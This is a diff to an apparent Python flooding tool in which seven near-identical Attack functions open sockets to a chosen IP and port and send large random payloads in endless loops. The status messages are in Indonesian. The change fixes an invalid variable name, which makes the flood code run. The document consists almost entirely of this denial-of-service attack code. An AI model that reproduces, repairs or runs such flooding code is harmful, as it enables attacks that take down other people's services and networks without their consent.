@@ -111,7 +111,7 @@ print(" [ ===============     ] 100%")
 os.system("clear")
 
 def Attack():
-	K-ibytes = random._urandom(5500055)
+	K_ibytes = random._urandom(5500055)
 	data = random._urandom(65500)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -119,14 +119,14 @@ def Attack():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(K-ibytes,addr,data)
+				sock.sendto(K_ibytes,addr,data)
 			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
 		except:
 			sock.close()
 			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
 
 def Attack2():
-	K-ibytes = random._urandom(550055)
+	K_ibytes = random._urandom(550055)
 	data = random._urandom(65500)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -134,14 +134,14 @@ def Attack2():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(K-ibytes,addr,data)
+				sock.sendto(K_ibytes,addr,data)
 			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
 		except:
 			sock.close()
 			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
 
 def Attack3():
-	K-ibytes = random._urandom(550055)
+	K_ibytes = random._urandom(550055)
 	data = random._urandom(65500)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -149,14 +149,14 @@ def Attack3():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(K-ibytes,addr,data)
+				sock.sendto(K_ibytes,addr,data)
 			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
 		except:
 			sock.close()
 			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
 
 def Attack4():
-	K-ibytes = random._urandom(550055)
+	K_ibytes = random._urandom(550055)
 	data = random._urandom(65500)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -164,14 +164,14 @@ def Attack4():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(K-ibytes,addr,data)
+				sock.sendto(K_ibytes,addr,data)
 			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
 		except:
 			sock.close()
 			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
 
 def Attack5():
-	K-ibytes = random._urandom(550055)
+	K_ibytes = random._urandom(550055)
 	data = random._urandom(65500)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -179,14 +179,14 @@ def Attack5():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(K-ibytes,addr,data)
+				sock.sendto(K_ibytes,addr,data)
 			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
 		except:
 			sock.close()
 			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
 
 def Attack6():
-	K-ibytes = random._urandom(550055)
+	K_ibytes = random._urandom(550055)
 	data = random._urandom(400)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -194,14 +194,14 @@ def Attack6():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(K-ibytes,addr,data)
+				sock.sendto(K_ibytes,addr,data)
 			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
 		except:
 			sock.close()
 			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
 			
 def Attack7():
-	K-ibytes = random._urandom(550055)
+	K_ibytes = random._urandom(550055)
 	data = random._urandom(400)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -209,7 +209,7 @@ def Attack7():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(K-ibytes,addr,data)
+				sock.sendto(K_ibytes,addr,data)
 			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
 		except:
 			sock.close()
